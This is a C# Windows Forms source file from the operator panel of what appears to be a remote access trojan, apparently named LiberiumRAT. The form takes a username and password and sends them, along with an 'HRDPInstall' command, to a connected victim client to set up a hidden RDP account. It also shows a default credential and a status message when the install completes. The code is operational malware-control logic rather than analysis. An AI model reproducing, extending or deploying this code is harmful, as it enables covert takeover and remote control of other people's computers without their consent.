using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormRDP : FormMaterial
{
	public Clients parrent;

	public string checksum;

	private IContainer components;

	private Timer timer1;

	private Panel panelTop;

	private TextBox textUserPass;

	private RJButton btnInstall;

	private RJButton btnClose;

	public FormRDP()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormRDP_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeTheme;
		MaterialSkinManager.Instance.ColorSchemeChanged += ChangeScheme;
		ChangeTheme(this);
		ChangeScheme(this);
		timer1.Start();
	}

	private void ChangeTheme(object sender)
	{
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color backColor = (isDark ? Color.FromArgb(40, 40, 40) : Color.White);
		Color textColor = (isDark ? Color.WhiteSmoke : Color.Black);
		BackColor = backColor;
		if (panelTop != null)
		{
			panelTop.BackColor = backColor;
		}
		if (textUserPass != null)
		{
			textUserPass.BackColor = (isDark ? Color.FromArgb(64, 64, 64) : Color.White);
			textUserPass.ForeColor = textColor;
			textUserPass.BorderStyle = BorderStyle.FixedSingle;
		}
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		_ = MaterialSkinManager.Instance.Theme;
		if (btnInstall != null)
		{
			btnInstall.BackColor = primary;
			btnInstall.BackgroundColor = primary;
			btnInstall.ForeColor = Color.White;
			btnInstall.TextColor = Color.White;
		}
		if (btnClose != null)
		{
			btnClose.BackColor = primary;
			btnClose.BackgroundColor = primary;
			btnClose.ForeColor = Color.White;
			btnClose.TextColor = Color.White;
		}
	}

	private void Closing1(object sender, FormClosingEventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Clients p = parrent;
		if (p == null || !p.itsConnect)
		{
			Close();
		}
	}

	private void btnClose_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void btnInstall_Click(object sender, EventArgs e)
	{
		if (parrent == null || !parrent.itsConnect || string.IsNullOrWhiteSpace(checksum))
		{
			return;
		}
		string value = textUserPass.Text.Trim();
		int idx = value.IndexOf('@');
		if (idx <= 0 || idx >= value.Length - 1)
		{
			MessageBox.Show("Format: User@Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return;
		}
		string username = value.Substring(0, idx);
		string password = value.Substring(idx + 1);
		try
		{
			byte[] credentials = LEB128.Write(new object[2] { username, password });
			parrent.Send(new object[3] { "Invoke", checksum, credentials });
			byte[] installPacket = LEB128.Write(new object[1] { "HRDPInstall" });
			parrent.Send(new object[3] { "Invoke", checksum, installPacket });
			btnInstall.Enabled = false;
		}
		catch (Exception)
		{
		}
	}

	public void Installed(string username, string password)
	{
		textUserPass.Text = username + "@" + password;
		textUserPass.Enabled = false;
		btnInstall.Enabled = false;
		string text = "Hidden RDP [";
		Text = text + parrent?.Hwid + "] установлен";
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panelTop = new System.Windows.Forms.Panel();
		this.btnClose = new CustomControls.RJControls.RJButton();
		this.btnInstall = new CustomControls.RJControls.RJButton();
		this.textUserPass = new System.Windows.Forms.TextBox();
		this.panelTop.SuspendLayout();
		base.SuspendLayout();
		this.timer1.Enabled = true;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.panelTop.BackColor = System.Drawing.Color.White;
		this.panelTop.Controls.Add(this.btnClose);
		this.panelTop.Controls.Add(this.btnInstall);
		this.panelTop.Dock = System.Windows.Forms.DockStyle.Top;
		this.panelTop.Location = new System.Drawing.Point(3, 64);
		this.panelTop.Name = "panelTop";
		this.panelTop.Size = new System.Drawing.Size(236, 69);
		this.panelTop.TabIndex = 0;
		this.btnClose.BackColor = System.Drawing.Color.FromArgb(63, 81, 181);
		this.btnClose.BackgroundColor = System.Drawing.Color.FromArgb(63, 81, 181);
		this.btnClose.BorderColor = System.Drawing.Color.FromArgb(63, 81, 181);
		this.btnClose.BorderRadius = 0;
		this.btnClose.BorderSize = 0;
		this.btnClose.FlatAppearance.BorderSize = 0;
		this.btnClose.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.btnClose.Font = new System.Drawing.Font("Arial", 9f);
		this.btnClose.ForeColor = System.Drawing.Color.White;
		this.btnClose.Location = new System.Drawing.Point(150, 35);
		this.btnClose.Name = "btnClose";
		this.btnClose.Size = new System.Drawing.Size(79, 26);
		this.btnClose.TabIndex = 3;
		this.btnClose.Text = "Close";
		this.btnClose.TextColor = System.Drawing.Color.White;
		this.btnClose.UseVisualStyleBackColor = false;
		this.btnClose.Click += new System.EventHandler(btnClose_Click);
		this.btnInstall.BackColor = System.Drawing.Color.FromArgb(63, 81, 181);
		this.btnInstall.BackgroundColor = System.Drawing.Color.FromArgb(63, 81, 181);
		this.btnInstall.BorderColor = System.Drawing.Color.FromArgb(63, 81, 181);
		this.btnInstall.BorderRadius = 0;
		this.btnInstall.BorderSize = 0;
		this.btnInstall.FlatAppearance.BorderSize = 0;
		this.btnInstall.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.btnInstall.Font = new System.Drawing.Font("Arial", 9f);
		this.btnInstall.ForeColor = System.Drawing.Color.White;
		this.btnInstall.Location = new System.Drawing.Point(9, 35);
		this.btnInstall.Name = "btnInstall";
		this.btnInstall.Size = new System.Drawing.Size(79, 26);
		this.btnInstall.TabIndex = 2;
		this.btnInstall.Text = "Install";
		this.btnInstall.TextColor = System.Drawing.Color.White;
		this.btnInstall.UseVisualStyleBackColor = false;
		this.btnInstall.Click += new System.EventHandler(btnInstall_Click);
		this.textUserPass.BackColor = System.Drawing.Color.White;
		this.textUserPass.Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
		this.textUserPass.ForeColor = System.Drawing.Color.Black;
		this.textUserPass.Location = new System.Drawing.Point(12, 70);
		this.textUserPass.Name = "textUserPass";
		this.textUserPass.Size = new System.Drawing.Size(220, 23);
		this.textUserPass.TabIndex = 1;
		this.textUserPass.Text = "LiberiumRAT@123456789";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(242, 137);
		base.Controls.Add(this.textUserPass);
		base.Controls.Add(this.panelTop);
		base.Name = "FormRDP";
		this.Text = "RDP: Login@Password";
		base.Load += new System.EventHandler(FormRDP_Load);
		this.panelTop.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
